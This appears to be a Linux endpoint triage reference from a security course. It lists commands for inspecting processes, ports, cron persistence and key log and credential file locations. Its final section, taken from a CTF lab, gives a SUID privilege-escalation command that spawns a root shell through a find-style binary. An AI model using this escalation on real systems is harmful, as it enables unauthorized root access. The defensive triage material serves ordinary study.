05 · Endpoint Security Monitoring

Linux Endpoint Triage — Full Command Reference

# List all running processes
ps aux

# Show process tree (parent/child)
ps auxf

# Find process by name
sudo ps aux | grep processname

# Show all listening ports + PIDs
sudo ss -tlnp

# Show all listening ports (alt)
sudo netstat -tlnp

# Show all active connections
sudo ss -anp

# Show active connections (alt)
sudo netstat -anob

# Check process binary path (symlink)
sudo ls -l /proc/[PID]/exe

# Read process command line invocation
sudo cat /proc/[PID]/cmdline | tr '\0' ' '

# Run ps against specific PID
sudo ps -p [PID] -f

# List open files for a process
sudo lsof -p [PID]

# Hash file for VirusTotal
sudo sha256sum /path/to/file

# Hash process even if file deleted
sudo sha256sum /proc/[PID]/exe

# Extract strings from binary
sudo strings /proc/[PID]/exe

# Filter strings for useful info
sudo strings /proc/[PID]/exe | grep -i 'usage\|version\|banner'

# Check system-wide cron jobs
sudo cat /etc/crontab

# Check cron.d directory
sudo ls -la /etc/cron.d/

# Check user cron jobs
sudo cat /var/spool/cron/crontabs/root

# Check cron directory contents
sudo ls -al /var/spool/cron/crontabs/

# List startup services
systemctl list-units --type=service

# Find recently modified files (1hr)
find / -mmin -60 -type f 2>/dev/null

# Find SUID binaries (privesc check)
find / -perm -4000 -type f 2>/dev/null

# Kill process by PID
sudo kill [PID]

# Kill process by name
sudo pkill processname

Key File Locations on Linux

PathSignificance
/tmpWorld-writable — #1 malware drop location
/var/tmpPersistent temp — also used by malware
/etc/crontabSystem cron jobs — persistence mechanism
/etc/cron.d/Additional cron directory — check this too
/var/spool/cron/crontabs/Per-user cron jobs
/etc/passwdUser account list
/etc/shadowPassword hashes (root only)
/var/log/auth.logAuthentication events
/var/log/syslogSystem events
/var/log/apache2/Web server logs
/proc/[PID]/Live process data — survives deletion!
/usr/local/bin/Custom binaries — check for SUID abuse
/root/.bash_historyRoot command history
/home/user/.bash_historyUser command history

SUID Binary Privilege Escalation

From the Lab (Janus/Mercury/Pluto CTF)
# Find all SUID binaries on system
find / -perm -4000 -type f 2>/dev/null

# Exploit SUID find binary (GTFOBins)
sys_check . -exec /bin/sh -p \; -quit

# Verify you escalated to root
whoami

SUID = Set User ID. If a binary has SUID and is owned by root, running it gives root privileges. GTFOBins (gtfobins.github.io) lists exploitable binaries.
